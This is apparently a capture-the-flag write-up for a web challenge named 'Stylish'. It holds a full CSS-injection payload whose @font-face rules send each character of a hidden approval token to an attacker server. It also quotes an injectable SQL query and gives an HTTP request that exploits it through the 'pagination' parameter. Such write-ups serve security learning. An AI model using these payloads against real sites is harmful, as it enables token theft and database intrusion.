# Challenge: Stylish
## Rate: Medium

Analyzing the source code:

```jsx
app.use(function(req, res, next) {
	res.setHeader("Content-Security-Policy", "default-src 'self'; object-src 'none'; img-src 'self'; style-src 'self'; font-src 'self' *;")
    next();
});
```

`font-src 'self' *;`: Allowing fonts from any origin (`'*'`) increases the risk of CSS-based attacks if an attacker can control the source of the fonts. Malicious fonts could be used to execute CSS-based attacks.

CSS Injection:

```css
@font-face {
  font-family: poc;
  src: url('https://q90u490hv2bsho9zv9uzkwczyq4hs7gw.oastify.com/?data');
}

body:has(p[id="approvalToken"]) {
  font-family: poc;
}
```

Since `<p id="approvalToken" class="d-none">{{ approvalToken }}</p>` has a `d-none` class, the bot cannot see the Token. So we should get rid of it by using `display: block !important;`

<details>
  <summary>
    Exfiltrate the `approvalToken` via CSS Injection:
  </summary>
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?a);
        unicode-range: U+0061; /* Character 'a' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?b);
        unicode-range: U+0062; /* Character 'b' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?c);
        unicode-range: U+0063; /* Character 'c' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?d);
        unicode-range: U+0064; /* Character 'd' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?e);
        unicode-range: U+0065; /* Character 'e' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?f);
        unicode-range: U+0066; /* Character 'f' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?g);
        unicode-range: U+0067; /* Character 'g' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?h);
        unicode-range: U+0068; /* Character 'h' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?i);
        unicode-range: U+0069; /* Character 'i' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?j);
        unicode-range: U+006A; /* Character 'j' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?k);
        unicode-range: U+006B; /* Character 'k' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?l);
        unicode-range: U+006C; /* Character 'l' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?m);
        unicode-range: U+006D; /* Character 'm' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?n);
        unicode-range: U+006E; /* Character 'n' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?o);
        unicode-range: U+006F; /* Character 'o' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?p);
        unicode-range: U+0070; /* Character 'p' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?q);
        unicode-range: U+0071; /* Character 'q' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?r);
        unicode-range: U+0072; /* Character 'r' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?s);
        unicode-range: U+0073; /* Character 's' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?t);
        unicode-range: U+0074; /* Character 't' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?u);
        unicode-range: U+0075; /* Character 'u' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?v);
        unicode-range: U+0076; /* Character 'v' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?w);
        unicode-range: U+0077; /* Character 'w' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?x);
        unicode-range: U+0078; /* Character 'x' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?y);
        unicode-range: U+0079; /* Character 'y' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?z);
        unicode-range: U+007A; /* Character 'z' */
    }
    
    /* Uppercase Letters (A to Z) */
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?A);
        unicode-range: U+0041; /* Character 'A' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?B);
        unicode-range: U+0042; /* Character 'B' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?C);
        unicode-range: U+0043; /* Character 'C' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?D);
        unicode-range: U+0044; /* Character 'D' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?E);
        unicode-range: U+0045; /* Character 'E' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?F);
        unicode-range: U+0046; /* Character 'F' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?G);
        unicode-range: U+0047; /* Character 'G' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?H);
        unicode-range: U+0048; /* Character 'H' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?I);
        unicode-range: U+0049; /* Character 'I' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?J);
        unicode-range: U+004A; /* Character 'J' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?K);
        unicode-range: U+004B; /* Character 'K' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?L);
        unicode-range: U+004C; /* Character 'L' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?M);
        unicode-range: U+004D; /* Character 'M' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?N);
        unicode-range: U+004E; /* Character 'N' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?O);
        unicode-range: U+004F; /* Character 'O' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?P);
        unicode-range: U+0050; /* Character 'P' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?Q);
        unicode-range: U+0051; /* Character 'Q' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?R);
        unicode-range: U+0052; /* Character 'R' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?S);
        unicode-range: U+0053; /* Character 'S' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?T);
        unicode-range: U+0054; /* Character 'T' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?U);
        unicode-range: U+0055; /* Character 'U' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?V);
        unicode-range: U+0056; /* Character 'V' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?W);
        unicode-range: U+0057; /* Character 'W' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?X);
        unicode-range: U+0058; /* Character 'X' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?Y);
        unicode-range: U+0059; /* Character 'Y' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?Z);
        unicode-range: U+005A; /* Character 'Z' */
    }
    
    /* Numbers (0 to 9) */
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?0);
        unicode-range: U+0030; /* Character '0' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?1);
        unicode-range: U+0031; /* Character '1' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?2);
        unicode-range: U+0032; /* Character '2' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?3);
        unicode-range: U+0033; /* Character '3' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?4);
        unicode-range: U+0034; /* Character '4' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?5);
        unicode-range: U+0035; /* Character '5' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?6);
        unicode-range: U+0036; /* Character '6' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?7);
        unicode-range: U+0037; /* Character '7' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?8);
        unicode-range: U+0038; /* Character '8' */
    }
    
    @font-face {
        font-family: poc;
        src: url(http://your_server_ip/?9);
        unicode-range: U+0039; /* Character '9' */
    }
    
    .d-none {
        display: block !important;
    }
    #approvalToken{
        font-family: poc;
    }
</details>

Now we have achieved the token characters are not sorted.

- `TokenHelper.js`
    
    ```jsx
    generateToken() {
      const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');
    
      // Shuffle characters and sort them in ASCII order
      return shuffle(dict).substring(0, 32).split('').sort().join('');
    }
    ```
    

Token pattern: `<Sorted_Numbers><Sorted_Uppercase_Letters><Sorted_Lowercase_Letters>`

CSS Injection for approving the post:

```css
@font-face {
  font-family: poc;
  src: url('http://localhost:1337/approve/1/2368BCEFGHLNOPRSTVYdeklmoqstuwyz');
}

body:has(p[id="approvalToken"]) {
  font-family: poc;
}
```

Submit a comment:

```
POST /api/comment/submit HTTP/1.1
Host: challengeIP:PORT
Content-Length: 43
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://challengeIP:PORT
Referer: http://challengeIP:PORT/
Connection: close

{"submissionID":1,"commentContent": "test"}
```

SQLI vulnerability in source code:

- `comment.js`
    
    ```jsx
    //...
    
    	fetch('/api/comment/entries', {
    		method: 'POST',
    		headers: {
    			'Content-Type': 'application/json',
    		},
    		body: JSON.stringify({submissionID: submissionID, pagination: pagination}),
    	})
    	
    //...
    ```
    
- `database.js`
    
    ```jsx
    //...
    
    async getSubmissionComments(submissionID, pagination=10) {
    	return new Promise(async (resolve, reject) => {
    		try {
                  const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
                  resolve(await this.db.all(stmt));
    		} catch(e) {
    			reject(e);
    		}
    	});
    }
    
    //...
    ```
    

SQLI via `pagination` parameter:

```
POST /api/comment/entries HTTP/1.1
Host: challengeIP:PORT
Content-Length: 45
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://challengeIP:PORT
Referer: http://challengeIP:PORT/
Connection: close

{"submissionID":1,"pagination": "10*"}
```

We can use SQLMap to achieve the flag:

Flag: `HTB{Th1s_1s_n0t_th3_r34l_fl4g}`
